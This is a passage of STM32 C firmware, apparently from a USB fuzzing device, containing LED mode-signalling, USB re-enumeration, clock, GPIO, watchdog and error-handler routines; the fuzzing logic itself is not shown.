 * Modes 18–22 : 2 long + (mode-17) short   (1–5 short)
 * Modes 23–30 : 3 long + (mode-22) short   (1–8 short) */
static void LED_LongBlink(void)
{
    HAL_GPIO_WritePin(LED_PORT, LED_PIN, GPIO_PIN_RESET);
    HAL_Delay(600U);
    HAL_GPIO_WritePin(LED_PORT, LED_PIN, GPIO_PIN_SET);
    HAL_Delay(250U);
}

static void LED_BlinkMode(uint8_t mode)
{
    if (mode == FUZZ_MODE_KBD_CRASH) {
        for (uint8_t i = 0; i < 4U; i++) {
            HAL_GPIO_WritePin(LED_PORT, LED_PIN, GPIO_PIN_RESET);
            HAL_Delay(800U);
            HAL_GPIO_WritePin(LED_PORT, LED_PIN, GPIO_PIN_SET);
            HAL_Delay(200U);
        }
        return;
    }
    if (mode <= 8U) { LED_Blink(mode); return; }
    if (mode <= 16U) {
        LED_LongBlink();
        LED_Blink((uint8_t)(mode - 8U));
        return;
    }
    if (mode <= 22U) {
        LED_LongBlink(); LED_LongBlink();
        LED_Blink((uint8_t)(mode - 17U));
        return;
    }
    /* modes 23-30 */
    LED_LongBlink(); LED_LongBlink(); LED_LongBlink();
    LED_Blink((uint8_t)(mode - 22U));
}

/* -----------------------------------------------------------------------
 * USB_DP_Reconnect — PA12 LOW for USB_RESET_PULSE_MS → force re-enum
 * ----------------------------------------------------------------------- */
static void USB_DP_Reconnect(void)
{
    GPIO_InitTypeDef g = {0};
    __HAL_RCC_GPIOA_CLK_ENABLE();
    g.Pin   = USB_DP_PIN;
    g.Mode  = GPIO_MODE_OUTPUT_PP;
    g.Pull  = GPIO_NOPULL;
    g.Speed = GPIO_SPEED_FREQ_HIGH;
    HAL_GPIO_Init(USB_DP_PORT, &g);
    HAL_GPIO_WritePin(USB_DP_PORT, USB_DP_PIN, GPIO_PIN_RESET);
    HAL_Delay(USB_RESET_PULSE_MS);
    g.Mode = GPIO_MODE_AF_PP;
    HAL_GPIO_Init(USB_DP_PORT, &g);
}

/* -----------------------------------------------------------------------
 * SystemClock_Config — 72 MHz via HSE 8 MHz + PLL×9, USB = 48 MHz
 * ----------------------------------------------------------------------- */
static void SystemClock_Config(void)
{
    RCC_OscInitTypeDef osc = {0};
    RCC_ClkInitTypeDef clk = {0};
    RCC_PeriphCLKInitTypeDef p = {0};

    osc.OscillatorType  = RCC_OSCILLATORTYPE_HSE | RCC_OSCILLATORTYPE_LSI;
    osc.HSEState        = RCC_HSE_ON;
    osc.HSEPredivValue  = RCC_HSE_PREDIV_DIV1;
    osc.LSIState        = RCC_LSI_ON;
    osc.PLL.PLLState    = RCC_PLL_ON;
    osc.PLL.PLLSource   = RCC_PLLSOURCE_HSE;
    osc.PLL.PLLMUL      = RCC_PLL_MUL9;
    HAL_RCC_OscConfig(&osc);

    clk.ClockType      = RCC_CLOCKTYPE_HCLK | RCC_CLOCKTYPE_SYSCLK
                       | RCC_CLOCKTYPE_PCLK1 | RCC_CLOCKTYPE_PCLK2;
    clk.SYSCLKSource   = RCC_SYSCLKSOURCE_PLLCLK;
    clk.AHBCLKDivider  = RCC_SYSCLK_DIV1;
    clk.APB1CLKDivider = RCC_HCLK_DIV2;
    clk.APB2CLKDivider = RCC_HCLK_DIV1;
    HAL_RCC_ClockConfig(&clk, FLASH_LATENCY_2);

    p.PeriphClockSelection = RCC_PERIPHCLK_USB;
    p.UsbClockSelection    = RCC_USBCLKSOURCE_PLL_DIV1_5;
    HAL_RCCEx_PeriphCLKConfig(&p);
}

/* -----------------------------------------------------------------------
 * MX_GPIO_Init — LED (PC13) + mode selection pins (PB2/PB3/PB4 pull-up)
 * ----------------------------------------------------------------------- */
static void MX_GPIO_Init(void)
{
    GPIO_InitTypeDef g = {0};

    __HAL_RCC_GPIOA_CLK_ENABLE();
    __HAL_RCC_GPIOB_CLK_ENABLE();
    __HAL_RCC_GPIOC_CLK_ENABLE();

    /* PC13 LED */
    HAL_GPIO_WritePin(LED_PORT, LED_PIN, GPIO_PIN_SET);
    g.Pin   = LED_PIN;
    g.Mode  = GPIO_MODE_OUTPUT_PP;
    g.Speed = GPIO_SPEED_FREQ_LOW;
    HAL_GPIO_Init(LED_PORT, &g);

    /* PB2/PB3/PB4 — mode selection, internal pull-up */
    g.Pin   = MODE_SEL_PIN0 | MODE_SEL_PIN1 | MODE_SEL_PIN2;
    g.Mode  = GPIO_MODE_INPUT;
    g.Pull  = GPIO_PULLUP;
    HAL_GPIO_Init(MODE_SEL_PORT, &g);
}

/* -----------------------------------------------------------------------
 * MX_IWDG_Init — ~26s timeout, kicked every IWDG_KICK_INTERVAL_MS
 * ----------------------------------------------------------------------- */
static void MX_IWDG_Init(void)
{
    hiwdg.Instance       = IWDG;
    hiwdg.Init.Prescaler = IWDG_PRESCALER_256;
    hiwdg.Init.Reload    = 0xFFFU;
    HAL_IWDG_Init(&hiwdg);
}

void Error_Handler(void)
{
    __disable_irq();
    UART_Log("ERROR_HANDLER");
    while (1) {
        HAL_GPIO_TogglePin(LED_PORT, LED_PIN);
        for (volatile uint32_t i = 0; i < 720000UL; i++) {}
    }
}
